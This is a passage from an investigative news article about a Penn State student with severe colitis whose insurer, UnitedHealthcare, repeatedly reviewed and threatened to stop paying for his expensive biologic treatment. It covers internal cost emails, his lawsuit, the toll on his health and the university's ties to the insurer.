<p data-pp-blocktype="copy" data-pp-id="108.0">When McNaughton enrolled at Penn State in 2020, it brought a sense of normalcy that he had lost when he was first diagnosed with colitis. He still needed monthly hours-long infusions and suffered occasional flare-ups and symptoms, but he was attending classes in person and living a life similar to the one he had before his diagnosis.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="109.0">It was a striking contrast to the previous six years, which he had spent largely confined to his parents’ house in State College. The frequent bouts of diarrhea made it difficult to go out. He didn’t talk much to friends and spent as much time as he could studying potential treatments and reviewing ongoing clinical trials. He tried to keep up with the occasional online course, but his disease made it difficult to make any real progress toward a degree.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="110.0">United, in correspondence with McNaughton, noted that its review of his care was “not a treatment decision. Treatment decisions are made between you and your physician.” But by threatening not to pay for his medications, or only to pay for a different regimen, McNaughton said, United was in fact attempting to dictate his treatment. From his perspective, the insurer was playing doctor, making decisions without ever examining him or even speaking to him.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="111.0">The idea of changing his treatment or stopping it altogether caused constant worry for McNaughton, exacerbating his colitis and triggering physical symptoms, according to his doctors. Those included a large ulcer on his leg and welts under his skin on his thighs and shin that made his leg muscles stiff and painful to the point where he couldn’t bend his leg or walk properly. There were daily migraines and severe stomach pain. “I was consumed with this situation,” McNaughton said. “My path was unconventional, but I was proud of myself for fighting back and finishing school and getting my life back on track. I thought they were singling me out. My biggest fear was going back to the hell.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="112.0">McNaughton said he contemplated suicide on several occasions, dreading a return to a life where he was housebound or hospitalized.</p>
        
    
                    
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="114.0">McNaughton and his parents talked about him possibly moving to Canada where his grandmother lived and seeking treatment there under the nation’s government health plan. </p>

<p data-pp-blocktype="copy" data-pp-id="114.1">Loftus connected McNaughton with a psychologist who specializes in helping patients with chronic digestive diseases.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="115.0">The psychologist, Tiffany Taft, said McNaughton was not an unusual case. About 1 in 3 patients with diseases like colitis suffer from medical trauma or PTSD related to it, she said, often the result of issues related to getting appropriate treatment approved by insurers.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="116.0">“You get into hopelessness,” she said of the depression that accompanies fighting with insurance companies over care. “They feel like ‘I can’t fix that. I am screwed.’ When you can’t control things with what an insurance company is doing, anxiety, PTSD and depression get mixed together.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="117.0">In the case of McNaughton, Taft said, he was being treated by one of the best gastroenterologists in the world, was doing well with his treatment and then was suddenly notified he might be on the hook for nearly a million dollars in medical charges without access to his medications. “It sends you immediately into panic about all these horrific things that could happen,” Taft said. The physical and mental symptoms McNaughton suffered after his care was threatened were “triggered” by the stress he experienced, she said.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="118.0">In early June 2021, United informed McNaughton in a letter that it would not cover the cost of his treatment regimen in the next academic year, starting in August. The insurer said it would only pay for a treatment plan that called for a significant reduction in the doses of the drugs he took.</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="120.0">United wrote that the decision came after his “records have been reviewed three times and the medical reviewers have concluded that the medication as prescribed does not meet the Medical Necessity requirement of the plan.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="121.0">In August 2021, McNaughton filed a federal lawsuit accusing United of acting in bad faith and unreasonably making treatment decisions based on financial concerns and not what was the best and most effective treatment. It claims United had a duty to find information that supported McNaughton’s claim for treatment rather than looking for ways to deny coverage.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="122.0">United, in a court filing, said it did not breach any duty it owed to McNaughton and acted in good faith. On Sept. 20, 2021, a month after filing the lawsuit, and with United again balking at paying for his treatment, McNaughton asked a judge to grant a temporary restraining order requiring United to pay for his care. With the looming threat of a court hearing on the motion, United quickly agreed to cover the cost of McNaughton’s treatment through the end of the 2021-2022 academic year. It also dropped a demand requiring McNaughton to settle the matter as a condition of the insurer paying for his treatment as prescribed by Loftus, according to an email sent by United’s lawyer.</p>

<p data-pp-blocktype="copy" data-pp-id="125.0">It is not surprising that insurers are carefully scrutinizing the care of patients treated with biologics, which are among the most expensive medications on the market. Biologics are considered specialty drugs, a class that includes the best-selling Humira, used to treat arthritis. Specialty drug spending in the U.S. is expected to reach $505 billion in 2023, according to an estimate from Optum, United’s health services division. The Institute for Clinical and Economic Review, a nonprofit that analyzes the value of drugs, found in 2020 that the biologic drugs used to treat patients like McNaughton are <a href="https://icer.org/wp-content/uploads/2020/08/ICER_UC_Final_Evidence_Report_101620.pdf">often effective but overpriced</a> for their therapeutic benefit. To be judged cost-effective by ICER, the biologics should sell at a steep discount to their current market price, the panel found.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="126.0">A panel convened by ICER to review its analysis cautioned that insurance coverage “should be structured to prevent situations in which patients are forced to choose a treatment approach on the basis of cost.” ICER also found examples where insurance company policies failed to keep pace with updates to clinical practice guidelines based on emerging research.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="127.0">United officials did not make the cost of treatment an issue when discussing McNaughton’s care with Penn State administrators or the family.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="128.0">Bill Truxal, the president of UnitedHealthcare StudentResources, the company’s student health plan division, told a Penn State official that the insurer wanted the “best for the student” and it had “nothing to do with cost,” according to notes the official took of the conversation.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="129.0">Behind the scenes, however, the price of McNaughton’s care was front and center at United.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="130.0">In one email, Opperman asked about the cost difference if the insurer insisted on only paying for greatly reduced doses of the biologic drugs. Kavanaugh responded that the insurer had paid $1.1 million in claims for McNaughton’s care as of the middle of May 2021. If the reduced doses had been in place, the amount would have been cut to $260,218, she wrote.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="131.0">United was keeping close tabs on McNaughton at the highest levels of the company. On Aug. 2, 2021, Opperman notified Truxal and a United lawyer that McNaughton “has just purchased the plan again for the 21-22 school year.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="132.0">A month later, Kavanaugh shared another calculation with United executives showing that the insurer spent over $1.7 million on McNaughton in the prior plan year.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="133.0">United officials strategized about how to best explain why it was reviewing McNaughton’s drug regimen, according to an internal email. They pointed to a justification often used by health insurers when denying claims. “As the cost of healthcare continues to climb to soaring heights, it has been determined that a judicious review of these drugs should be included” in order to “make healthcare more affordable for our members,” Kavanaugh offered as a potential talking point in an April 23, 2021, email.</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="135.0">Three days later, UnitedHealth Group filed an annual statement with the U.S. Securities and Exchange Commission disclosing its pay for top executives in the prior year. Then-CEO David Wichmann was paid $17.9 million in salary and other compensation in 2020. Wichmann retired early the following year, and his total compensation that year exceeded $140 million, according to calculations in a <a href="https://www.startribune.com/former-unitedhealth-ceo-made-142-2m-last-year/600171979/">compensation database</a> maintained by the Star Tribune in Minneapolis. The newspaper said the amount was the most paid to an executive in the state since it started tracking pay more than two decades ago. About $110 million of that total came from Wichmann exercising stock options accumulated during his stewardship.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="136.0">The McNaughtons were well aware of the financial situation at United. They looked at publicly available financial results and annual reports. Last year, United reported a profit of $20.1 billion on revenues of $324.2 billion.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="137.0">When discussing the case with Penn State, Light said, she told university administrators that United could pay for a year of her son’s treatment using just minutes’ worth of profit.</p>

<p data-pp-blocktype="copy" data-pp-id="139.0">McNaughton has been able to continue receiving his infusions for now, anyway. In October, United notified him it was once again reviewing his care, although the insurer quickly reversed course when his lawyer intervened. United, in a court filing, said the review was a mistake and that it had erred in putting McNaughton’s claims into pending status.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="140.0">McNaughton said he is fortunate his parents were employed at the same school he was attending, which was critical in getting the attention of administrators there. But that help had its limits.</p>

<p data-pp-blocktype="copy" data-pp-id="140.1">In June 2021, just a week after United told McNaughton it would not cover his treatment plan in the upcoming plan year, Penn State essentially walked away from the matter.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="141.0">In an email to the McNaughtons and United, Penn State Associate Vice President for Student Affairs Andrea Dowhower wrote that administrators “have observed an unfortunate breakdown in communication” between McNaughton and his family and the university health insurance plan, “which appears from our perspective to have resulted in a standstill between the two parties.” While she proposed some potential steps to help settle the matter, she wrote that “Penn State’s role in this process is as a resource for students like Chris who, for whatever reason, have experienced difficulty navigating the complex world of health insurance.” The university’s role “is limited,” she wrote, and the school “simply must leave” the issue of the best treatment for McNaughton to “the appropriate health care professionals.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="142.0">In a statement, a Penn State spokesperson wrote that “as a third party in this arrangement, the University’s role is limited and Penn State officials can only help a student manage an issue based on information that a student/family, medical personnel, and/or insurance provider give — with the hope that all information is accurate and that the lines of communication remain open between the insured and the insurer.”</p>
        
    
                        
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="144.0">Penn State declined to provide financial information about the plan. However, the university and United share at least one tie that they have not publicly disclosed.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="145.0">When the McNaughtons first reached out to the university for help, they were referred to the school’s student health insurance coordinator. The official, Heather Klinger, wrote in an email to the family in February 2021 that “I appreciate your trusting me to resolve this for you.”</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="146.0">In April 2022, United began paying Klinger’s salary, an arrangement which is not noted on the university website. Klinger appears in the online staff directory on the Penn State University Health Services webpage, and has a university phone number, a university address and a Penn State email listed as her contact. The school said she has maintained a part-time status with the university to allow her to access relevant data systems at both the university and United.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="147.0">The university said students “benefit” from having a United employee to handle questions about insurance coverage and that the arrangement is “not uncommon” for student health plans.</p>

<p data-pp-blocktype="copy" data-pp-id="147.1">The family was dismayed to learn that Klinger was now a full-time employee of United. </p>

<p data-pp-blocktype="copy" data-pp-id="147.2">“We did feel betrayed,” Light said. Klinger did not respond to an email seeking comment.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="148.0">McNaughton’s fight to maintain his treatment regimen has come at a cost of time, debilitating stress and depression. “My biggest fear is realizing I might have to do this every year of my life,” he said.</p>
        
    
                                  
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="150.0">McNaughton said one motivation for his lawsuit was to expose how insurers like United make decisions about what care they will pay for and what they will not. The case remains pending, a court docket shows.</p>
        
    
                    
<p data-pp-blocktype="copy" data-pp-id="151.0">He has been accepted to Penn State’s law school. He hopes to become a health care lawyer working for patients who find themselves in situations similar to his. </p>
